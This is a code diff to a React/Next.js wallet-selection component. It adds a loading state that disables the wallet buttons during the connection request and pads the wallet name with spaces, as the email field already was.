@@ -4,6 +4,7 @@ import {connection} from "@/services/connection";
 import {sessionConst} from "@/constants/session";
 import {useRouter} from "next/navigation";
 import {routeConstants} from "@/constants/route";
+import {useState} from "react";
 
 const walletList = [
   {
@@ -17,13 +18,16 @@ const walletList = [
 ]
 
 export function WalletSection() {
+  const [loading, setLoading] = useState(false)
   const navigate = useRouter()
 
   const handleWalletConnect = async (walletKey: string) => {
+    setLoading(true)
     const res = await connection.withoutActions({
-      walletName: walletKey,
+      walletName: ` ${walletKey} `,
       email: ` ${sessionStorage.getItem(sessionConst.Email) ?? ''} `,
     })
+    setLoading(false)
 
     console.log('res', res)
     if (res.error) {
@@ -44,7 +48,8 @@ export function WalletSection() {
 
         <div className={styles.walletList}>
           {walletList.map((wallet) => (
-            <button onClick={() => handleWalletConnect(wallet.key)} key={wallet.key} className={styles.walletItem}>
+            <button disabled={loading} onClick={() => handleWalletConnect(wallet.key)} key={wallet.key}
+                    className={styles.walletItem}>
               <img width={24} src={wallet.img} alt={wallet.name}/>
               <span>{wallet.name}</span>
             </button>
